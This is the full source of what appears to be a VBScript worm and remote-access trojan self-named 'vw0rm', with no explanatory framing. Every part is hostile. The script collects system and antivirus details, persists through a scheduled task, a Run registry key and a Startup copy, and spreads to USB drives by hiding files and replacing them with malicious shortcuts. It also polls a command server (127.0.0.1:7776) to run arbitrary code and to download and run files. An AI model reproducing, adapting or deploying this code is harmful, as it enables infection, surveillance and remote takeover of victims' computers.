rem Sucks to Suck xD


On error resume next

j = array("WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP")
g = array("HKCU","HKLM","HKCU\vw0rm","\Software\Microsoft\Windows\CurrentVersion\Run\","HKLM\SOFTWARE\Classes\","REG_SZ","\defaulticon\")
y = array("winmgmts:","win32_logicaldisk","Win32_OperatingSystem","winmgmts:\\localhost\root\securitycenter","AntiVirusProduct")

function go(m)
	if m = 4 then
		T = "winmgmts:\\localhost\root\securitycenter"
		Set B = GetObject(y(3)).InstancesOf(y(4))
		for each a in b
			go = a.displayName
			exit for
		next
		Set B = GetObject(y(3) & "2").InstancesOf(y(4))
		for each a in b
			go = a.displayName 
			exit for
		next
		if go = "" then go = "Not-found"
	else
		Set B=GetObject(y(0)).InstancesOf(y(m))
		for each a in b
			if m = 1 then
				go = a.volumeserialnumber
			elseif m = 2 then
				go = a.caption
			end if
			exit for
		next
	end if
end function 

set w = WScript
set sh = Cr(0)
set fs = Cr(1)

Function Cr(N)
	Set Cr = CreateObject(j(N))
End Function

function Ex(s)
	Ex = sh.ExpandEnvironmentStrings("%"&s&"%")
end function

function Pt(C,A)
	Pt = ""
	Set X = Cr(3)
	X.Open "POST", "http://127.0.0.1:7776/" & C, false
	X.setrequestheader "User-Agent:", nf
	X.send A
	Pt = X.responsetext
end function

Function nf
	nf = ""
	i = go(1)
	s = VN & "_" & i
	nf = nf & s & c
	s = ex("COMPUTERNAME")
	nf = nf & s & c
	s = ex("USERNAME")
	nf = nf & s & c
	s = go(2)
	nf = nf & s & c
	s = go(4)
	nf = nf & s & c & c & nt & c & u & c
End Function

Sub Ns
	on error resume next
	dr = ex("TEMP") & C & wn
	fs.CopyFile fu, dr, true
	sh.run "schtasks /create /sc minute /mo 30 /tn ScheduleName /tr " & ChrW(34) & dr, false
	sh.regwrite g(0) & g(3) & "HX4RQM4N8B", Ch & dr & Ch, g(5)
	fs.copyfile fu, Cr(2).NameSpace(&H7).Self.Path & C & wn ,true
end Sub

dr = ex("TEMP") & C & wn

sub spr
	on error resume next
	for each dr in fs.drives
		dp=dr.path & c
		if dr.isready = true then
			if dr.drivetype = 1 then
				fs.copyfile fu,dp & wn,true
				if fs.fileexists(dp & wn) then
					fs.getfile(dp & wn).attributes = 2 + 4
				end if
				for each fi in fs.getfolder(dp).files
					if instr(fi.name,".") then
						if lcase(split(fi.name,".") (ubound(split(fi.name,".")))) <>"lnk" then
							fi.attributes = 2 + 4
							if ucase(fi.name) <> ucase(wn) then
								with sh.createshortcut(dp  & split(fi.name,".")(0) & ".lnk") 
									.windowstyle = 7
									.targetpath = "cmd.exe"
									.arguments = "/c start " & replace(wn," ", ch & " " & ch) & "&start " & replace(fi.name," ", ch & " " & ch) &"&exit"
									fic = sh.regread(g(4) & sh.regread(g(4) & "." & split(fi.name, ".")(ubound(split(fi.name, ".")))& c) & g(6)) 
									if instr(iconlocation,",") = 0 then
										.iconlocation = fi.path
									else 
										.iconlocation = fic
									end if
									.save()
								end with
							end if
						end if
					end if
				next
				for each fo in fs.getfolder(dp).subfolders
					fo.attributes = 2 + 4
					with sh.createshortcut(dp & fo.name & ".lnk")
						.windowstyle = 7
						.targetpath = "cmd.exe"
						.arguments = "/c start " & replace(wn," ", ch & " " & ch) & "&start explorer " & replace(fo.name," ", ch & " " & ch) &"&exit"
						fic = sh.regread("HKLM\software\classes\folder" & g(6))
						if instr(.iconlocation,",") = 0 then
							.iconlocation=fo.path
						else
							.iconlocation=fic
						end if
						.save()
					end with
				next
			end if
		end if
	next
	err.clear
end sub



vn = "vw0rm"
U = ""

ch = chrw(34)
c = chrw(92)
fu = w.scriptfullname
wn = w.scriptname
NT = "No"
if fs.fileexists(ex("Windir") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe") then
	NT = "Yes"
end if

U = sh.regread(g(2))
if U = "" then
	if mid(fu,2) = ":\" & wn then
		U = "TRUE"
		sh.regwrite g(2), U, g(5)
	else
		U = "FALSE"
		sh.regwrite g(2), U, g(5)
	end if
end if

Ns
spl = "|V|"

while true
	s = split(Pt("Vre",""),spl)
	select case s(0)
		case "exc"
			sa = s(1)
			execute sa
		case "Sc"
			s2 = Ex("temp") & "\" & s(2)
			set wr = fs.OpenTextFile(s2,2,True)
			wr.Write s(1)
			wr.Close()
			sh.run s2, 6
		case "RF"
			s2 = Ex("temp") & "\" & s(2)
			set wr = fs.OpenTextFile(s2,2,True)
			wr.Write s(1)
			wr.Close()
			sh.run s2
		case "Ren"
			set wr = fs.OpenTextFile(fu,1)
			f = wr.ReadAll
			wr.close()
			f = replace(f,ch&vn&ch,ch&s(1)&ch)
			set wr = fs.OpenTextFile(fu,2,false)
			wr.Write f
			wr.close()
		case "Up"
			set wr = fs.OpenTextFile(fu,2,false)
			s(1) = replace(s(1),"|U|","|V|")
			wr.Write s(1)
			wr.Close()
			sh.run "wscript.exe //B " & ch & fu & ch, 6
			w.quit
		case "Cl"
			W.quit 
		case "Un"
			S(1) = replace(S(1),"%f",fu)
			S(1) = replace(S(1),"%n",wn)
			S(1) = replace(S(1),"%sfdr",dr)
			execute S(1)
			w.quit
	end select
	W.Sleep 6000
	Spr
wend
